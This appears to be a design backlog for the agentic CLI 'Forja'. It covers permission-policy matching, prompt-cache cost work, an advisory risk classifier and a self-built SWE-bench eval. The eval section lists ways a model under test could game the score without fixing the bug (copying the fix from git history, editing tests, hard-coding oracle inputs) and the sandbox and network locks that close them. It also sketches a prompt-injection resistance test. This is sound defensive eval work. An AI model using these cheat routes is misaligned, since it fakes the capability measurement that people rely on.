- ✅ ~~Sandbox of tool execution (`AGENTIC_CLI §9.1` M4.x). Cheaper
  defense, larger impact.~~ — **Met as of slices 118-119** (Linux
  bwrap + macOS `sandbox-exec` `hide_paths` defense), slice 119
  closes the macOS half via SBPL. Sandbox profile selection +
  hide_paths cover the structural defense the original TODO
  expected to land first. The other two pre-reqs below remain.
- Static analysis of operator-supplied policy (warn at boot
  when a policy contains `*` in allow patterns alongside
  metachars in deny — pedagogical, lighter than AST).
- Permission ergonomics Tier 2-5 (pattern learning,
  templates, etc) closer to landing — those build a base of
  operator-edited policies that an AST migration would
  need to handle.

With the sandbox pre-req met, the primary pull-in signal
remaining is operator-articulated demand for semantic policy
rules — a concrete complaint like "I want to allow any safe git
command but block destructive ones" or "deny redirect to `/etc/**`
keeping cwd redirects" that glob can't express precisely.

**Estimated work (when pulled):**

- ~1 week — wire `tree-sitter-bash` into a parser module,
  basic node types exposed to the matcher
- ~1 week — refactor `engine.checkBash` to traverse AST
  with rule application per node
- ~1 week — schema redesign + migration of existing policies
  to the new shape, eval coverage proving no regression on
  current operator policies
- + spec PR cycle for `AGENTIC_CLI §8` policy schema and
  `SECURITY_GUIDELINE` updates

**Spec reference:** `AGENTIC_CLI.md §8` (permission policy
schema would change), `SECURITY_GUIDELINE.md` (threat model
adjustments), `src/permissions/matcher.ts` (current glob
matcher to be augmented or replaced).

---

# Token-efficiency initiative

Four related items that together close the loop on input-cost
reduction (cache hit-rate + tool-output minimization). They were
identified during a 2026-05-26 audit that compared Forja's runtime
against industry observations of how mature agents extract
token-efficiency wins (cache locality, structured compaction,
semantic vs. generic tool output, observability of the cache
layer).

Order matters: **#3 lands first** (visibility — without it every
other change is unfalsifiable); then **#1** (largest structural
win); then **#4** (largest tool-loop win); **#2** is conditional
on what #3 measures (its blast radius collapses once #1 splits
the system block).

The items are sequenced this way deliberately. Bundle order
matches: `feat/token-eff-cache-stats` → `feat/token-eff-system-split`
→ `feat/token-eff-output-summarize` → `feat/token-eff-today-eviction`.

## Cache hit-rate observability

**Status:** deferred. Field `UsageInfo.cache_read` / `cache_creation`
(`src/providers/types.ts:58-63`) is plumbed through the assistant
turn and consumed by `computeCost` (`src/providers/cost.ts:30-42`),
but operator-facing surface stops there — no chip in the footer,
no aggregate per session, no audit event, no recap line. Today
"did caching help?" requires a manual SQL join across
`message_usage` rows.

**What it is:** expose cache health at three levels of granularity:

1. **Footer chip** — `${pct}% cached`, where
   `pct = cacheRead / (cacheRead + cacheCreation + uncachedInput)`.
   Sits to the right of `% context used`. No `warn` color (this
   is informational, not a saturation alert).
2. **Per-session aggregate** — new columns on the `sessions` row
   (`cache_read_total`, `cache_creation_total`,
   `uncached_input_total`) updated at the end of each turn.
3. **Audit event** — `provider:cache_stats` per turn, NDJSON-
   consumable. Lets external tooling chart hit-rate over time
   without re-aggregating from raw usage rows.
4. **Recap line** — `cache: 73% (read 12k / write 4k / fresh 5k)`
   in the session-end terse render.

**Why deferred:** zero direct token savings; documented as the
"multiplier" for the rest of this initiative. The chip surface is
small enough to bundle with the structural fixes, but landing it
first means subsequent work can be measured rather than asserted.

**Where it would land:**

- `src/tui/state.ts` — `StatusState` gains `sessionCacheRead`,
  `sessionCacheCreation`, `sessionUncachedInput`; reducer in
  `assistant:end` accumulates from `pendingAssistant`.
- `src/tui/render/footer.ts` — new chip slot after `% context used`,
  suppressed until any usage event has landed.
- `src/storage/migrations/` — new migration adding three columns
  to `sessions`.
- `src/harness/loop.ts` (around the usage update site, near
  `totalCostUsd += turnCostUsd`) — write the aggregates back.
- `src/recap/terse.ts` (or the equivalent renderer) — new line
  rendered from session aggregates.
- `src/audit/events.ts` (or `src/harness/types.ts` `HarnessEvent`) —
  declare the `provider:cache_stats` shape.

**Pull-in signal:** committing to either #1 or #4 below. Without
this surface, those changes ship blind.

**Cost when pulled:** ~1 day for the chip + state slice (sliceable
alone, demonstrable from `bun run dev`). ~1 day for migration +
session-repo + recap + audit event.

**Spec reference:** small additions to `UI.md §4.10.6` (chip)
and `AUDIT.md` (event). No subsystem reframing.

## System prompt cache-breakpoint split

**Status:** deferred. `src/providers/anthropic/cache.ts:16-29`
already documents the gap explicitly — the comment block calls
out that fusing `[system] + [project_context] + [memory_index]`
into a single `TextBlockParam` collapses three of the four
breakpoints `CONTEXT_TUNING.md §3.1` declares. Today's runtime
uses 3 of the 4 Anthropic-permitted markers (system, last tool,
conversation tail); the fourth is reachable as soon as
`composeSystemPrompt` (`src/cli/memory-prompt.ts:360`) returns
structured segments instead of a concatenated string.

**What it is:** change the system-prompt assembly to emit
discrete segments, each with its own invalidation envelope:

| Segment | Breakpoint | Invalidation |
|---|---|---|
| identity + environment + ergonomics + constraints | ✅ | cross-session, new `today` |
| project pointer | (sub-segment of identity block) | rare — repo move |
| memory index | ✅ | per `memory_write` / lifecycle event |
| tools schema | ✅ (existing) | tool palette change |
| conversation tail | ✅ (existing) | per turn |

A `memory_write` mid-session today invalidates the entire CP#1
(~6K tokens of identity + env + project + memory). After the
split, only the memory segment (~2K tokens) re-pays cache-write
cost. The identity prefix sails through.

**Why deferred:** structural change to `GenerateRequest.system`
contract (`src/providers/types.ts:131-167`) — touches every
provider adapter (Anthropic, OpenAI, Google). Adapters that
don't natively support multi-segment system blocks (OpenAI,
Google) collapse the array back to a single concatenated string
transparently.

**Where it would land:**

- `src/providers/types.ts:131-167` — `system?: string | SystemSegment[]`.
  New type:

  ```ts
  export interface SystemSegment {
    id: 'identity' | 'environment' | 'project' | 'memory' | …;
    text: string;
    cacheBreakpoint?: boolean;  // adapter-specific
  }
  ```

- `src/cli/memory-prompt.ts:360` — `composeSystemPrompt` returns
  `SystemSegment[]`.
- `src/cli/bootstrap.ts:785-821` — assembler keeps the per-section
  `composeWith*` helpers but final step produces the array
  rather than a concatenated string.
- `src/providers/anthropic/cache.ts:44-49` —
  `systemWithCacheBreakpoint` accepts `SystemSegment[]`, maps
  segments with `cacheBreakpoint: true` to `TextBlockParam` with
  ephemeral marker.
- `src/providers/anthropic/index.ts:88, 205` — call sites.
- `src/providers/openai/`, `src/providers/google/` — adapters
  collapse `SystemSegment[]` to a single string (compat path).
- `src/providers/anthropic/cache.ts:117-145` —
  `countCacheBreakpoints` continues to assert `≤ 4` per request;
  the planned layout reaches exactly 4 (3 system-side + 1 tail).

**New tests:**

- `tests/providers/anthropic-cache.test.ts` — one breakpoint per
  `cacheBreakpoint: true` segment.
- A `memory_write` between turns invalidates ONLY the memory
  segment (`cache_creation` accrues to that block; the rest
  reads from cache).
- Total breakpoint count stays `≤ 4` under typical Forja prompt.
- OpenAI / Google adapters receive a concatenated string when
  fed `SystemSegment[]` (compat regression).

**Pull-in signal:** cache observability (above) has landed and
operator can quote a baseline hit-rate.

**Cost when pulled:** ~2 days. Spec PR against
`CONTEXT_TUNING.md §3.1` ratifying the 4-breakpoint layout that
section already predicts.

**Estimated economic impact:** sessions with N memory writes
save `(N × ~4K_tokens × cache_write_rate)`. On Opus
($6.25/M cache write): ~$0.025 saved per memory write. Modest
per-session, compounds with project-pointer changes and skill-
catalog updates that today also bust the fused block.

## Tool-output auto-summarization

**Status:** deferred. Static caps live on each tool today —
`src/tools/builtin/bash.ts` (4 MiB), `read-file.ts` (10 MiB /
2000 lines), `grep.ts` (200 results), `glob.ts` (1000 matches),
`bash-output.ts` (64 KiB / stream). The caps prevent
catastrophic blowouts but do nothing about a "500 KB stdout that
fits under the cap and rides the conversation history until
compaction at 70% context fires." Largest single tool-loop win
remaining.

**What it is:** a two-tier output reduction stage that sits
between tool execution and the `tool_result` message:

**Tier 1 — deterministic policies** (no LLM, no extra latency):

| Tool | Threshold | Policy |
|---|---|---|
| `bash` (stdout/stderr) | > 16 KB | head-tail (100 lines each + `[N lines elided]` marker) |
| `bash_output` (background poll) | > 8 KB | head-tail (50 / 50) |
| `read_file` | already paginated | no change |
| `grep` | > 50 hits | group-by-file (path + count per file) |
| `glob` | > 200 matches | head-tail by path with count |
| `fetch_url` | > 32 KB | structure fingerprint for HTML / JSON (extract keys, drop bodies) |

**Tier 2 — LLM summarizer** (opt-in per tool, Haiku-cheap):
triggers above ~64 KB when deterministic head-tail loses too
much signal. Prompt: "Summarize this tool output for an agent
that called `<tool>` with goal `<goal>`. Keep only what's
relevant. ≤ 200 tokens."

Both tiers emit a marker on the `tool_result` block:
`output_summarized: true`, `original_bytes: N`. The audit log
(`tool_outputs` row) retains the raw output. A future
`expand_last_output` tool can re-fetch the raw when the model
realises it needs detail it lost.

**Why deferred:** policy question (per-tool thresholds, when to
escalate to LLM tier, how operators override) is not a runtime
emergency. Want #3 in place first so the win is measurable;
without it, deciding which policies pay off is guesswork.

**Where it would land:**

- `src/tools/output-summarizer.ts` (new) — Tier 1 policies as
  pure functions:

  ```ts
  export interface OutputSummary {
    summarized: string;
    reduced: boolean;
    originalBytes: number;
    policy: string;  // 'head_tail' | 'group_by_file' | …
  }

  export const headTailSummary = (text: string, opts: {
    maxBytes: number; headLines: number; tailLines: number;
  }): OutputSummary;

  export const groupByFileSummary = (matches: GrepMatch[]):
    OutputSummary;

  export const structureFingerprintSummary = (output: string):
    OutputSummary;
  ```

- `src/tools/llm-output-summarizer.ts` (new) — Tier 2,
  Haiku-driven, parameterized by goal + tool name.
- `src/tools/invoke-tool.ts` — hook between tool execution and
  `tool_result` construction. Single decision point.
- `src/tools/builtin/{bash,grep,glob,fetch_url}.ts` — declare
  policy + threshold in tool metadata.
- `src/storage/repos/tool-outputs.ts` (or wherever audit
  persistence lives) — guarantee raw output is preserved
  irrespective of summarization.
- `src/tools/builtin/expand_last_output.ts` (future, low
  priority) — operator/model-driven escape hatch to re-fetch the
  pre-summary content.

**New tests:**

- `bash` > 16 KB triggers `head_tail`; ≤ 16 KB passes through.
- `grep` with 100 hits across 5 files: `group_by_file` produces
  ~5 lines.
- Summarized result carries `output_summarized: true`.
- Audit log retains original after summarization.
- LLM summarizer is not called when deterministic policy
  reduces below threshold.

**Pull-in signal:** observed hit-rate (#3) shows non-trivial
input-cost spend on tool-result blocks. Concretely: median
session input includes > 5K tokens of `tool_result` content per
turn averaged across 10 sessions.

**Cost when pulled:** ~3 days for Tier 1 across the four tools
+ tests. ~1 day for Tier 2 + opt-in wiring + Haiku integration.

**Spec reference:** new section in `TOOL_ERGONOMICS.md`
("Output policy"), or a sibling `OUTPUT_POLICY.md`. Cross-ref
from `CONTEXT_TUNING.md §6` (compaction relies on outputs
already being right-sized).

**Risk:** summarization that drops a load-bearing detail. The
`expand_last_output` escape hatch is the planned mitigation but
not strictly required for first ship — `output_summarized: true`
plus the per-tool policy contract is enough signal for the model
to re-invoke the tool with narrower args.

## Eviction of `today` from the cached system prefix

**Status:** deferred. `src/cli/environment-prompt.ts:118` emits
`- today: ${input.today}` inside the environment block that
sits in cache breakpoint #1; `src/cli/bootstrap.ts:811` captures
the value once at bootstrap. Within a session the date is
stable and CP#1 reads cleanly; across session boundaries that
span local midnight, CP#1 invalidates and pays a full
`cache_creation` for the prefix.

**What it is:** move the `today` field out of the cached system
prefix. Anthropic does not expose an "ephemeral system" surface,
so the only sane home is the first `user` message of the
conversation:

```text
[context]
today: 2026-05-26

<actual user prompt>
```

Subsequent turns do not re-inject. A resumed session keeps the
original `today` from when the session was first booted —
correct semantics: continuity of the work session matters more
than "wall-clock today" for the model's interpretation of
relative time references inside that work.

**Why deferred:** blast radius collapses once #1 (system split)
lands. With identity + environment isolated to their own
breakpoint segment (~1K tokens), a cross-session midnight cross
costs ~`1K × cache_write_rate` = ~$0.006 per Opus resume — too
small to chase in isolation. Worth doing only if #3
measurements show cross-session resume is a common access
pattern AND the cumulative cost shows up in operator-visible
spend.

**Where it would land:**

- `src/cli/environment-prompt.ts:118` — remove the `today` line
  from `renderEnvironmentSection`.
- `src/cli/environment-prompt.ts` (new export) —
  `renderTodayPreamble(today: string): string` for the first-turn
  injection format.
- `src/harness/loop.ts` (message-init path) — on session start,
  prepend the preamble to the first user message before sending.
- `src/storage/repos/sessions.ts` — persist `boot_today` on the
  session row so resume does not re-inject.

**New tests:**

- `today` does not appear anywhere in the rendered system
  prompt.
- First turn of a fresh session carries the preamble in
  `messages[0]`.
- Second turn does NOT re-inject.
- Resume from a prior session does not re-inject and keeps the
  original `boot_today`.

**Pull-in signal:** #3 measurements show > 10% of sessions
suffer a cache miss on CP#1 due to midnight crossing OR
operator-driven `forja resume` after the date has changed.
Without that evidence, this is theoretical cleanup.

**Cost when pulled:** ~0.5 day.

**Spec reference:** small amendment to `CONTEXT_TUNING.md §1.8`
where `today` is currently justified as part of the env block.

## Anthropic `extended_cache` (1h TTL)

**Status:** deferred. Forja's Anthropic adapter pins
`cache: 'server_5min'` (see `src/providers/anthropic/capabilities.ts:6`)
and emits `cache_control: { type: 'ephemeral' }` with no `ttl`
field, which defaults to the 5-minute server cache. Identified
during the post-#1/#3/#4 token-efficiency audit as the largest
remaining cache miss vector: ANY gap > 5 minutes between turns —
operator pausing to think, reading a long output, switching
windows — kills the entire cache, not just one segment.

**What it is:** opt into Anthropic's 1-hour extended cache
(`CONTEXT_TUNING.md §3.3`) by emitting
`cache_control: { type: 'ephemeral', ttl: '1h' }` and reflecting
the capability via `cache: 'server_persistent'` (or a new
`server_1h` variant) on `ProviderCapabilities`. Trade-off
Anthropic discloses: cache writes cost ~2× input rate instead of
1.25×, but reads stay at 0.10× for the full hour. Math crosses
zero around the second turn after a > 5min gap.

**Why deferred:**

1. **Pricing trade-off needs real data.** A session with
   frequent < 5min cadence between turns sees zero benefit and
   pays slightly more on writes. Without baseline from the
   `% cached` chip (#3), we'd ship blind on whether typical
   operator usage actually has the > 5min gaps the 1h TTL
   amortizes.
2. **Per-call opt-in** vs **global setting**: Anthropic lets the
   `ttl` ride per cache_control marker, so a more nuanced policy
   could mark the high-stability segments (stable + memory) with
   `1h` and leave the conversation tail at `5min` (tail moves
   every turn anyway). That mixed policy might dominate either
   pure default — but it adds complexity worth validating with
   data first.

**Where it would land:**

- `src/providers/anthropic/cache.ts:39` — `EPHEMERAL` constant
  becomes either a factory taking `ttl` or a pair of constants
  (`EPHEMERAL_5MIN`, `EPHEMERAL_1H`). Each `cache_control`
  call site picks the right one based on segment role.
- `src/providers/anthropic/capabilities.ts:6` — `cache` field
  reflects the active mode; potentially adds `server_1h` /
  `server_persistent` to `CacheMode` in `providers/types.ts:10`.
- Config surface: `[providers.anthropic] extended_cache = true`
  in user / project TOML; wired into bootstrap when the adapter
  is instantiated.
- `src/cli/bootstrap.ts` — read the config flag and pass it to
  `createAnthropicProvider`.
- Per-segment policy variant: extend `SystemSegment` with
  optional `cacheTtl?: '5min' | '1h'` so producers can pick per
  segment, and `systemSegmentsWithCacheBreakpoints` honors it.

**New tests:**

- `tests/providers/anthropic-cache.test.ts` — cache_control with
  `ttl: '1h'` flows through when the flag is set; default `5min`
  otherwise. Per-segment override respected when present.
- `tests/cli/bootstrap.test.ts` — config flag round-trips into
  the adapter instance.

**Pull-in signal:** cache observability (#3) has accumulated
enough sessions to show:
- median gap between turns in real operator usage, OR
- `% cached` chip stabilizing below ~70% in long sessions
  (suggesting cache_control is being invalidated mid-session by
  TTL, not by content change).

**Cost when pulled:** ~1 day (uniform 1h TTL). ~2 days for the
per-segment mixed policy + tests.

**Spec reference:** `CONTEXT_TUNING.md §3.3` already documents
the trade-off and recommends the flag for sessions > 30min;
landing it is making the spec real. No spec PR needed.

**Magnitude (uncertain):** sessions with regular > 5min pauses
get the dominant input-cost reduction Anthropic advertises
(~70% per `PROVIDERS.md §5.1`). At the limit, this is bigger
than #1 + #2 combined for operator usage patterns that involve
real-world pacing (reading output, thinking, switching apps).

---

# Operator feedback infrastructure (fine-tuning pre-req)

## Explicit operator feedback widget per turn

**Status:** deferred. Forja's audit captures a near-complete
training signal — `prompt_versions` (content-addressed system
prompts), `messages` (role + content + token usage),
`tool_calls` (input + raw output preserved even when
summarized), `cost_progress_events`, `failure_events`, plus the
`audit_timeline` view (`AUDIT.md §2.1`) that unifies all of
the above. Outcome signals exist via `outcome_signals` with the
four NEGATIVE proxies declared in `src/outcomes/codes.ts:16-20`
(`tool_error`, `failure_event`, `checkpoint_reverted`,
`session_aborted`). What's missing is an EXPLICIT POSITIVE /
per-turn signal from the operator — the dataset has plenty of
"this went wrong" rows and no "this answer was helpful" rows.

**What it is:** a TUI surface that lets the operator rate the
last assistant turn (or the last tool call) without breaking
flow. Shape options (decide at pull-in):

- **Minimal**: two keybindings (e.g., `Alt+Up` / `Alt+Down`)
  that emit `signal_kind: 'operator_positive'` /
  `'operator_negative'` against the current step. Zero
  cognitive overhead; binary signal.
- **Nuanced**: one-key shortcut opens a popover with reasons
  (`wrong tool`, `right tool, bad args`, `solved my problem`,
  `kept me unblocked`, …). Better data quality, friction
  trade-off.
- **Implicit augment**: track `restart_after`, `undo_within_N`,
  `corrected_in_next_turn` as additional implicit signal
  kinds. Cheaper than a widget but inferential — not
  ground-truth.

**Why deferred:** Forja has no fine-tuning effort in flight
today; landing the widget without a downstream consumer is
infrastructure built for the abstract. The substrate
(`outcome_signals`) already exists, so when the need crystallizes
it's a small additive change, not a redesign. Also: an
ill-designed widget that interrupts flow degrades the operator
experience for everyone in exchange for data quality only the
fine-tuning workflow benefits from. The cost/benefit only
makes sense when there's a buyer.

**Where it would land:**

- `src/outcomes/codes.ts:16-20` — extend `OutcomeSignalKind`
  with `operator_positive` / `operator_negative` (or richer
  set). Add to migration's CHECK enum. Per `codes.ts:11`, a
  new kind requires `(a)` entry here, `(b)` ALTER on enum,
  `(c)` wiring at observation site — the contract is
  documented inline.
- `src/storage/migrations/` — new migration adding the new
  signal_kinds to the CHECK constraint.
- `src/tui/keys.ts` + `src/tui/render/footer.ts` — keybind
  registration; small footer chip showing "rated ↑" / "rated
  ↓" for the most recent turn so the operator knows the
  rating registered.
- `src/tui/events.ts` — new `feedback:rate` UIEvent.
- `src/tui/state.ts` — reducer tracks pending rating per
  turn (so it can attach to the right `tool_call_id` or
  `message_id`).
- `src/cli/repl.ts` — bridge bus event to
  `appendOutcomeSignal` with the right ids.
- `src/cli/slash/commands/` — `/feedback metrics` (or
  similar) for the operator to review their own rating
  history before exporting.

**New tests:**

- Keybind emits the event with correct payload.
- Reducer attaches the rating to the most recent
  `tool_call_id` (or `message_id` for prose-only turns).
- Storage layer persists the new kind with the configured
  default weight.

**Pull-in signal:**

- Fine-tuning effort is planned (LoRA, DPO, full SFT — any of
  them needs labeled data).
- OR: systematic quality regression evaluation needs to A/B
  changes (e.g., post-token-efficiency-initiative review:
  "did #4's summarization hurt quality?").
- OR: operator explicitly asks for a way to flag turns for
  review.

**Cost when pulled:**

- Minimal binary version: ~2 days (keybinding + reducer + 1
  migration + 1 slash + tests).
- Nuanced popover version: ~4-5 days (add modal + reason
  vocab + reducer state + richer storage).
- Implicit-only version: ~1 day (detector that scans audit
  trail for restart / undo / correction patterns, emits new
  signal kinds without a TUI surface).

**Spec reference:** extends `PERMISSION_ENGINE.md §6.3.2`'s
calibration plan (which today only considers system-observed
proxies) and `AUDIT.md §1` (adds a new outcome_signal kind).
The widget itself touches `UI.md §4.10.6` (footer chip) and
new keybinding entries.

**Magnitude:** zero direct token savings (this entry isn't
token-efficiency). Multiplier on every future quality-driven
optimization: without ground-truth labels, every A/B comparison
relies on inference from negative proxies + heuristics.

## Learned risk classifier (GBDT — LightGBM / XGBoost) behind the classifier-adjust seam

**Status:** deferred. A gradient-boosted-decision-trees model that
scores command risk from the capability feature vector — the
classic-ML tool for tabular data (fraud / credit / ranking), near
neural-net accuracy with far less operational weight. It is NOT a new
pipeline: it drops into the existing **classifier-adjust seam**.

**Where it plugs in (the seam already exists):**

- **Features = the capability model.** A resolved call is already a
  tabular row: `{has delete-fs, has exec:arbitrary, write-fs,
  net-egress, git-write, path-outside-cwd, …}` plus the additive
  `score_components` from `risk-score.ts`. No new feature plumbing —
  the capabilities ARE the features.
- **Output = a score adjustment**, consumed by the same stage the
  current classifier feeds: `src/permissions/classifier.ts` → the
  `classifier` reason-chain stage ("Estágio 4 ajustou score") →
  versioned by `classifier_hash` in the audit row. A GBDT is an
  ALTERNATIVE classifier implementation behind that seam, not a
  rewrite.
- **Training data = `approvals_log`.** The hash-chained ledger +
  `reason_chain` + `score_components_json` + the operator's actual
  approve/deny is labeled tabular history, already captured. That is
  the "thousands–millions of historical decisions" corpus the model
  needs.
- **Inference-only in the binary.** Train offline; embed the model
  (~100 KB–few MB) + an inference path — NOT the training lib. Avoids
  the bundle-weight objection raised against tree-sitter (~5 MB) in
  the AST-based bash matching item above.

**Load-bearing guardrails (what makes this safe, not an oracle):**

- **Advisory, never authority.** The model adjusts score/confidence
  only; the deterministic floors stay hard — `deny`/`refuse`,
  protected-path, sensitive-path (§8.4), the compound guard, and the
  autonomous capability-confinement. A model can never auto-approve
  what the engine would deny (fail-closed, principle 1).
- **Eval-gated** (principle 4: a subsystem without eval doesn't ship)
  — precision/recall per tier before it's wired on.
- **Reproducible.** `classifier_hash` already enters the replay
  inputs, so a versioned model artifact keeps forensic replay honest.
- **No cargo cult** (principle 12 / `ANTI_PATTERNS`) — `RISK_SCORE_WEIGHTS`
  + the capability resolver deliver ~95% today; the model earns its
  keep only past the corpus threshold.

**Why deferred:** heuristic weighted scoring (`risk-score.ts`) plus the
AST capability resolver already cover the catastrophic and common
shapes. A GBDT's operational cost (offline training pipeline, model
versioning, drift monitoring, bundle) is not justified before there is
both a large labeled corpus AND demonstrated mis-scoring the weights
can't separate. Orthogonal to the AST-based bash matching item (that
sharpens POLICY EXPRESSION; this sharpens the RISK SCORE) — either can
land without the other.

**Pull-in signal:** (a) `approvals_log` accumulates thousands+ decisions
AND a measurable class of mis-scored commands surfaces (operator
repeatedly overrides the score-driven verdict on shapes the additive
weights can't separate); (b) demand for richer per-feature attribution
than the current additive `score_components` already gives; (c) a
concrete model wins a published eval against the tuned weights. Until
then: tune `RISK_SCORE_WEIGHTS`. Preferred engine: **LightGBM**
(smaller / faster / lower memory, fits the single-binary CLI).

# Eval — capability signal via self-SWE-bench from git history

**Goal.** The model ranking (`scripts/model-ranking.ts` / `docs/RANKING.md`) measures
**harness-fit** — did the model call the right tool, land the exact edit format, finish
before the cap. That correlates with capability but is confounded by convention-matching:
a capable model can rank low for using `write_file` instead of `edit_file`. Add a signal
that measures **capability** — did the model actually solve the problem, verified by a
ground-truth check independent of HOW it acted ("performed well in Forja" → "is a strong
model").

**The idea.** Forja's "born with tests" rule (`CLAUDE.md`) means every fix commit ships a
`src/` change + a test. So the git history IS a ready-made task corpus — SWE-bench on
Forja's own repo. For a fix commit `C` with parent `P`:

- Split the diff by path: **test patch** = `tests/**`, gold **source patch** = `src/**`
  (ignore `docs/`).
- Workspace = a snapshot of the repo at `P` via `git archive P` extracted to a temp dir —
  **no `.git`** (so the agent can't `git show <C>` and copy the fix). Apply the test patch
  on top → the test now exists and FAILS.
- Deps: symlink `node_modules` (do not reinstall per task).
- Prompt = the failing test as the spec: "this test fails; diagnose and fix the source so
  it passes, without editing the test." NOT the BACKLOG prose (it describes the solution →
  leak). BACKLOG / git is only the **selector** of candidate commits.
- Verifier (fail-to-pass): run that test file + `bun run typecheck`. Pass = the bug is
  fixed by OUTCOME, regardless of tool/format — that is the capability signal.

**Correctness gates (load-bearing).**

- **Validate each candidate automatically:** the test must FAIL at `P`+testpatch and PASS
  at `C`. Otherwise it is not a real fail-to-pass (refactor, flaky, test that already
  passed) → drop it. This filter is what makes the corpus trustworthy.
- **No `.git` in the workspace** (hence `git archive`, not a worktree) — anti-cheat is
  load-bearing; otherwise the original fix is one `git log --all` away.
- **Deterministic tests only** (mock-based; most Forja tests are). Model non-determinism is
  the eval's inherent variance → repeats.
- **Scope the verifier** to the specific test file, not the whole suite (speed).
- **Sandbox the verifier** ✅ DONE. `command_succeeds { sandboxed: true }` wraps the verifier in
  the `cwd-rw` profile (ro outside cwd, network off) with `failClosed: true` — a host with no
  sandbox tool FAILS the verifier instead of running model-authored `bun test` with the runner's
  env/FS. With bwrap present, `--clearenv` + `SAFE_ENV_VARS` drop `*_KEY`/`*_TOKEN`.

**Anti-cheat gaps (Phase 2, load-bearing before any UNTRUSTED model runs).** A code-review pass on
the Phase-1 machinery found cheat surfaces the test-file restore + sandboxed verifier do NOT close.
The outcome IS the score, so each is a way to inflate the capability signal WITHOUT fixing the bug.
Close before running the corpus on third-party models:

- **Cut the AGENT's network.** ✅ DONE (Docker egress lock). The task container sits on an
  `--internal` network whose only route out is a proxy sidecar allowlisting the model host alone, so
  curl / git fetch reach nothing else (github is 403'd) — and `bun test` still runs (no real net
  needed). The earlier in-process `denyNetwork` sandbox option did this for the in-process path and
  was REMOVED with it (the path let the agent read the live answer by absolute path — superseded by
  the container boundary).
- **Broaden / freeze the restore.** ✅ DONE. `restoreSweTests` `rm`s + re-archives the whole `tests/`
  tree from C (no model-added test survives) and restores-or-DELETES the test-runner config
  (`bunfig.toml`/`tsconfig.json`/`package.json`/`bun.lock` + the `.env*` bun auto-loads).
  `materializeSweWorkspace` also strips the leak surface (`docs/BACKLOG.md`/`docs/TODO.md`/
  `evals/swe-bench/`) from the workspace.
- **PASS_TO_PASS** ✅ DONE (the regression half). Each corpus task carries `passToPass` = ≤3 sibling
  test files (same dir as the oracle) that pass at C, vetted under the runner's `cwd-rw` sandbox; the
  runner runs them as a second verifier and records `regressed` (oracle passed but a sibling broke).
  `scripts/swe-bench-passtopass.ts` enriches the corpus, ranking siblings that import the changed
  `srcFiles` FIRST (✅ the same-`srcFiles` heuristic — a tighter overfit guard than plain same-DIR).
- **Withhold the visible oracle** ⏳ NOT done. The oracle is VISIBLE in the workspace, so a model can
  hard-code the test's exact inputs. Classic SWE-bench HIDES the test (gives only the failure output).
  A separate, bigger design change (the verifier needs the test, but the agent shouldn't see it).

**Prerequisite — ✅ DONE.** The `command_succeeds` expectation kind: runs an author-specified
command in the workspace cwd after the agent, asserts exit 0, with a per-command timeout
(SIGTERM-labeled) and a failure log tail; spawn-failure fails the expectation, not the case
(eval types + loader + executor + tests). The verifier for this whole class (and reusable for a
hermetic inline fail-to-pass eval). NOTE: runs UNSANDBOXED — see the sandbox-the-verifier gate
above before pointing it at model-authored files.

**Reporting.** ✅ DONE — `docs/BENCHMARK.md` is the capability-axis doc (per-tier pass-rate, hand-
refreshed from `results.csv`, with the derived taxonomy/efficiency/fluency axes). Do NOT fold this into
the harness-fit composite (RANKING.md keeps "separate axes, never folded in"). Add a `capability` axis =
pass-rate of the verified suite. Tag each task with a difficulty tier (1 = trivial fix, 2 = multi-
location / reasoning, 3 = multi-file / recover-from-wrong-attempt) and report per-tier, so the score
reflects a capability CEILING, not a uniform pass-rate.

**Honest caveat.** Still "capability AS exercised through Forja's loop" — the model acts
through the harness; it is not a vacuum benchmark. But outcome-verification removes the
format/convention confound. It is the most honest capability claim an agent harness can
make, and fairer than the current one.

**Cost / why staged.** A dedicated harness (snapshot / split / validate), NOT a
`setup.files` YAML case — core-file fixes (`loop.ts`, ~3k lines) can't be inlined, so the
agent edits the real large file → high context + steps → per-task budget matters. Upside:
it **generates tasks forever** (every future fix is a new task, automatically).

**Phases.**

1. ✅ DONE — but the in-process `setup.swe` EXECUTOR path was later REMOVED (Docker supersedes; it
   ran the agent on the host where it could read the live answer by absolute path). KEPT and reused by
   the Docker runner: `command_succeeds` (framework + test) and the shared
   `src/evals/swe-bench/workspace.ts` (materialize + restore-from-commit + isolated deps). Proven
   end-to-end on `0be3c4299` (wait_for IPv6): `git archive C^` + test patch + node_modules symlink,
   restore-from-commit anti-cheat, the sandboxed verifier, verifier scoping. Surfaced + fixed the
   restore mechanism (archive-from-commit, NOT re-apply-patch) and the shallow-clone gate (tests
   skipIf the commit + parent are absent).
2. ✅ DONE (corpus v1). The miner (`scripts/swe-bench-mine.ts`: candidateCommits / tierOf /
   validateFailToPass / mineCorpus) scans history for src+test fix commits and validates each is a
   real fail-to-pass (measured ~94% over a 3-month window, 1329 candidates → bulk-to-500 feasible).
   The curated v1 corpus (`evals/swe-bench/corpus.json`) is 50 hand-curated tasks (40 bugs + 10
   features, ~20 subsystems, tiers 1=14 / 2=24 / 3=12) — SWE-bench-Verified style. The BACKLOG is
   the SELECTOR only; the prompt is the failing test, never the commit/BACKLOG prose. Remaining:
   scale to bulk ~500 (run the miner over a wide window + 2 robustness tweaks — per-candidate
   `bun test` timeout + exclude meta commits whose src is wholly under `src/evals/`|`scripts/`).
3. Tier + wire into the ranking as the `capability` axis (needs the corpus runner #10 + the
   load-bearing anti-cheat gates before any untrusted-model run).

**Adjacent (lower priority, separate, no framework change).** A **prompt-injection
resistance** eval — `setup.files` carries a malicious instruction inside untrusted content
(a doc the agent reads, a tool result); the prompt is the legitimate task; expectations
assert the task is done AND the malicious action did NOT happen (`tool_not_called` /
`file_not_exists` / `file_not_contains`). Feasible with the current expectation kinds,
deeply aligned with Forja's trust / permission model, a sibling of the existing "security
posture refuses destructive command" regression cases.

**Out of scope (would be cargo-cult of other benchmarks, `ANTI_PATTERNS §2.2`).** The eval
harness is a temp dir + the in-process agent — it cannot host ML/PyTorch (Terminal-Bench
model tasks), VM/QEMU/SSH (sysadmin tasks), Coq (formal proofs), full GAIA multimodal
(spreadsheets / PDFs / images), or a browser. Forcing those tests infra Forja is not.

**Pull-in signal:** a model lands in the ranking that is clearly capable but scores low on
harness-fit (convention mismatch), making the gap between "fits Forja" and "is strong"
concrete — OR a second model tier is added and the ranking needs to discriminate real
capability, not just loop-fit.
